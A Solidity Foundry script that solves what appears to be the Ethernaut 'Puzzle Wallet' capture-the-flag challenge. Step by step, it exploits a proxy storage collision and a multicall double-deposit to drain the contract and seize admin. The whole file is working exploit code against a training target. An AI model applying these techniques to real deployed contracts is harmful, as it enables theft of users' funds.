// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
    function admin() external view returns (address);
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

/**
 * @title Challenge 24 Solution Script
 * @notice Exploit proxy storage collision to become admin
 */
contract PuzzleWalletSolution is Script {
    address constant INSTANCE = 0xD34F6c9310749F999Aa371C0AB5dde146E149545;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: proposeNewAdmin sets pendingAdmin (slot 0 = owner in wallet)
        IPuzzleProxy(INSTANCE).proposeNewAdmin(player);

        // Step 2: Now we're the owner in PuzzleWallet, whitelist ourselves
        IPuzzleWallet(INSTANCE).addToWhitelist(player);

        // Step 3: Use multicall with nested deposit to double-count the deposit
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        data[1] = abi.encodeWithSelector(IPuzzleWallet.multicall.selector, depositData);

        IPuzzleWallet(INSTANCE).multicall{value: 0.001 ether}(data);

        // Step 4: Drain the contract (our balance is counted as 2x what we sent)
        IPuzzleWallet(INSTANCE).execute(player, 0.002 ether, "");

        // Step 5: Set maxBalance to our address (slot 1 = admin in proxy)
        IPuzzleWallet(INSTANCE).setMaxBalance(uint256(uint160(player)));

        vm.stopBroadcast();

        console.log("Admin:", IPuzzleProxy(INSTANCE).admin());
        console.log("Challenge 24 completed!");
    }
}
